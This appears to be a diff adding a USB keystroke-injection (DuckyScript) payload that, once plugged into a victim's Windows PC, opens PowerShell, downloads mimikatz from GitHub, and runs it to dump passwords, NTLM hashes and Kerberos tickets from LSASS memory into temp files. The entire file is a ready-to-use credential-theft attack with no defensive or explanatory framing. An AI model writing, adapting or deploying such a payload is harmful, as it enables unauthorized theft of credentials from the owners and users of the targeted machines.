@@ -1,0 +1,40 @@
+REM ============================================================
+REM   Mimikatz Credential Extractor - Drops mimikatz on target PC
+REM   Downloads mimikatz from GitHub and extracts credentials from memory (LSASS)
+REM
+REM   Uses: sekurlsa::logonpasswords to dump passwords, NTLM hashes, Kerberos tickets
+REM ============================================================
+
+DELAY 2000
+
+STRING powershell -NoProfile -Command "$ProgressPreference = 'SilentlyContinue'; $env:TEMP"
+ENTER
+DELAY 1000
+
+STRING mkdir "$env:TEMP\mimikatz" -Force
+ENTER
+DELAY 500
+
+STRING cd "$env:TEMP\mimikatz"
+ENTER
+DELAY 200
+
+REM Download mimikatz (x64 version from GitHub)
+STRING powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/3.1.0/mimikatz.exe' -OutFile 'mimikatz.exe'"
+ENTER
+DELAY 8000
+
+REM Run mimikatz to extract credentials from LSASS memory
+STRING powershell -NoProfile -Command "$output = & '.\mimikatz.exe' 'sekurlsa::logonpasswords' 'exit' 2>&1; $output | Out-File '$env:TEMP\mimikatz\results.txt'"
+ENTER
+DELAY 5000
+
+REM Also dump NTLM hashes
+STRING powershell -NoProfile -Command "$output = & '.\mimikatz.exe' 'sekurlsa::wdigest' 'exit' 2>&1; $output | Out-File '$env:TEMP\mimikatz\wdigest.txt'"
+ENTER
+DELAY 3000
+
+REM Verify extraction worked
+STRING if (Test-Path "$env:TEMP\mimikatz\results.txt") { echo "Mimikatz credentials extracted successfully!" } else { echo "Mimikatz run completed." }
+ENTER
+SLEEP 2000
